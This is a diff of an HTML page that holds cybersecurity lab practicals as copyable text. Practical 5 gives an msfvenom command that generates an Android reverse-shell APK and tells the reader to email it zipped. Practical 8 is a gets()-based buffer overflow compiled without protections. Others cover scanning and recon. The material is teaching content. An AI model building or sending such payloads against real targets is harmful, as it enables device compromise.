@@ -1,3 +1,5 @@
+update below so that buttons should not be bright but should be premiums
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -186,4 +188,226 @@
       4. Drag and drop the text file into S-Tools, then enter a passphrase.
       5. Save the duplicate image created by S-Tools.
       6. Delete the original text file.
-      7. Drag
+      7. Drag the duplicate image back into S-Tools, right-click, and select Reveal.
+      8. Enter the same passphrase to extract and restore the text file.`,
+          practical5: `Practical 5: Create a Virus Using msfvenom
+      
+      1. Open Kali Linux in VirtualBox.
+      2. Generate a malicious APK file:
+      msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 R> <output_file.apk>
+      3. Compress the '.apk' file into a '.zip' file (e.g., photo.zip).
+      4. Send the '.zip' file via email to simulate a virus attack.
+      5. Check if the recipient’s antivirus flags the file as malicious.`,
+          practical6: `Practical 6: Use PuTTY and SSH to Demonstrate File Transfer
+      
+      1. Install SSH on Kali Linux:
+      sudo apt-get install openssh-server
+      2. Start the SSH service:
+      service ssh start
+      3. Verify SSH status and IP address:
+      service ssh status
+      ifconfig eth0
+      4. Download and install PuTTY on Windows.
+      5. Open PuTTY and connect using the IP address, port 22, and select SSH.
+      6. Create or transfer files between the local and remote systems, then verify file access.`,
+          practical7A: `Practical 7A: Check Data Integrity Using Simple Parity Check (Python Code)
+      
+      def calculate_parity(data):
+      # Count the number of '1's in the data
+      count_of_ones = data.count('1')
+      return 0 if count_of_ones % 2 == 0 else 1
+      
+      def check_parity(data_with_parity):
+      data = data_with_parity[:-1]
+      received_parity = int(data_with_parity[-1])
+      calculated_parity = calculate_parity(data)
+      return received_parity == calculated_parity
+      
+      # Input binary data
+      user_data = input("Enter binary data (without parity bit): ")
+      if set(user_data).issubset({'0', '1'}):
+      parity_bit = calculate_parity(user_data)
+      print(f"Calculated Parity Bit: {parity_bit}")
+      data_with_parity = user_data + str(parity_bit)
+      print(f"Data with Parity Bit: {data_with_parity}")
+      received_data = input("Enter received data with parity bit: ")
+      if check_parity(received_data):
+      print("Data is intact.")
+      else:
+      print("Data is corrupted.")
+      else:
+      print("Invalid input!")`,
+          practical7B: `Practical 7B: Check Data Integrity Using 2D Parity Check (Python Code)
+      
+      def two_d_parity_check(data):
+      row_parity = []
+      col_parity = [0] * len(data[0])
+      for row in data:
+      row_parity_bit = sum(row) % 2
+      row_parity.append(row_parity_bit)
+      for i, elem in enumerate(row):
+          col_parity[i] ^= elem
+      return row_parity, col_parity
+      
+      def check_data_integrity(data, row_parity, col_parity):
+      for i, row in enumerate(data):
+      if sum(row) % 2 != row_parity[i]:
+          return False
+      for i, col in enumerate(col_parity):
+      if sum(row[i] for row in data) % 2 != col:
+          return False
+      return True
+      
+      # Example usage
+      data = [[1, 0, 1], [0, 1, 0], [1, 1, 1]]
+      row_parity, col_parity = two_d_parity_check(data)
+      print("Row parity:", row_parity)
+      print("Column parity:", col_parity)
+      if check_data_integrity(data, row_parity, col_parity):
+      print("Data is intact.")
+      else:
+      print("Data is corrupted.")`,
+          practical8: `Practical 8: Simulate a Buffer Overflow Attack
+      
+      1.	Create a vulnerable C program:
+      
+      #include <stdio.h>
+      
+      void vulnerable_function() {
+      char buffer[10]; // Small buffer
+      printf("Enter some input: ");
+      gets(buffer); // Vulnerable function
+      printf("You entered: %s\n", buffer);
+      }
+      
+      int main() {
+      printf("Demonstrating Buffer Overflow\n");
+      vulnerable_function();
+      return 0;
+      }
+      
+      2.	Save the file as vul.c.
+      3.	Compile it with protections disabled:
+      gcc -fno-stack-protector -z execstack -o vul vul.c
+      4. Run the program:
+      ./vul
+      
+      5.	Test it:
+      •	Enter a normal input (e.g., Hello).
+      •	Enter an overflowing input (e.g., AAAAAAAAAAAAAAAAA) to trigger a segmentation fault.`,
+          practical9: `Practical 9: Implement Network Scanning Using Zenmap
+      
+      1.	Open Zenmap (GUI for Nmap).
+      2.	Enter the Target IP Address (e.g., your PC or mobile IP).
+      3.	Select Intense Scan from the Profile dropdown.
+      4.	Click on Scan and wait for the results.
+      5.	Analyze the output:
+      •	Open ports, running services, and possible vulnerabilities.`,
+          practical10: `Practical 10: Examine SSH and Telnet Vulnerabilities
+      
+      Part 1: Telnet Vulnerabilities
+      
+      1.	Update and Install Telnet:
+      •	Run the following commands in the terminal:
+      sudo apt-get update
+      sudo apt install telnet
+      sudo apt install busybox-static
+      
+      2.	Start Telnet Server:
+      •	Run the following command to start the Telnet daemon:
+      busybox telnetd -f -p 23
+      •	Here, -f runs it in the foreground, and -p 23 sets it to listen on port 23.
+      
+      3.	Connect via Telnet:
+      •	From the same machine, open a Telnet session to localhost:
+      •	Enter a username and password if prompted.
+      
+      4.	Simulate a Vulnerability:
+      •	Use Wireshark to capture Telnet traffic:
+      •	Open Wireshark, start capturing on the appropriate network interface.
+      •	Apply the filter:
+      telnet
+      •	Observe that Telnet transmits data (including credentials) in plain text.
+      
+      5.	Demonstrate Potential Exploit:
+      •	An attacker monitoring the network can capture credentials or sensitive data using tools like Wireshark.
+      
+      
+      Part 2: SSH Security
+      
+      1.	Install OpenSSH Server:
+      •	Run the following commands:
+      sudo apt-get update
+      sudo apt install openssh-server
+      2.	Start the SSH Service:
+      •	Enable and start the SSH service:
+      sudo systemctl enable ssh
+      sudo systemctl start ssh
+      3.	Verify SSH Status:
+      •	Check if the SSH service is running:
+      sudo systemctl status ssh
+      4.	Connect to the SSH Server:
+      •	From another machine or the same machine, use the ssh command:
+      ssh <username>@<IP_address>
+      •	Replace <username> with the target system’s username and <IP_address> with the machine’s IP (e.g., from ifconfig).
+      
+      5.	Analyze SSH Traffic:
+      •	Use Wireshark to capture SSH traffic:
+      •	Open Wireshark and start capturing on the correct network interface.
+      •	Apply the filter:
+      ssh
+      •	Observe that all communication is encrypted.
+      
+      6.	Compare SSH and Telnet:
+      •	Note the difference:
+      •	Telnet transmits data in plain text, making it vulnerable to eavesdropping.
+      •	SSH encrypts the data, providing a secure communication channel.
+      `,
+          practical11: `Practical 11: Demonstrate the Use of Netcraft for Information Gathering
+      
+      1.	Open the Netcraft website or use its browser extension.
+      2.	Enter the Target Domain or IP address (e.g., example.com).
+      3.	Analyze the results:
+      •	Hosting provider details.
+      •	Security configurations.
+      •	Technologies used (e.g., web server, CMS).
+      •	Potential vulnerabilities.`,
+          practical12: `Practical 12: Implement Network Tools
+      
+      Steps:
+      
+      1.	WHOIS Command: Retrieve domain/IP registration details.
+      whois <domain_name>
+      2.	NSLOOKUP Command: Perform DNS lookups.
+      nslookup <domain_name>
+      3.	NMAP Command: Scan for open ports and services.
+      nmap -sV <target_IP>
+      4.	DNSENUM Command: Enumerate DNS records.
+      dnsenum <domain_name>
+      5.	BMON Command: Monitor network bandwidth.
+      sudo apt-get install bmon
+      bmon`,
+      
+      };
+      
+      // Function to inject code into the code containers and copy it to clipboard
+      function copyCode(practicalId) {
+          // Get the corresponding code from the codeBlocks object
+          let code = codeBlocks[practicalId];
+      
+          // Inject the code into the code container
+          document.getElementById(practicalId).innerText = code;
+      
+          // Create a temporary textarea to copy the code
+          let tempInput = document.createElement('textarea');
+          tempInput.style.position = 'absolute';
+          tempInput.style.opacity = '0';
+          tempInput.value = code;
+          document.body.appendChild(tempInput);
+          tempInput.select();
+          document.execCommand('copy');
+          document.body.removeChild(tempInput);
+      }
+    </script>
+  </body>
+</html>
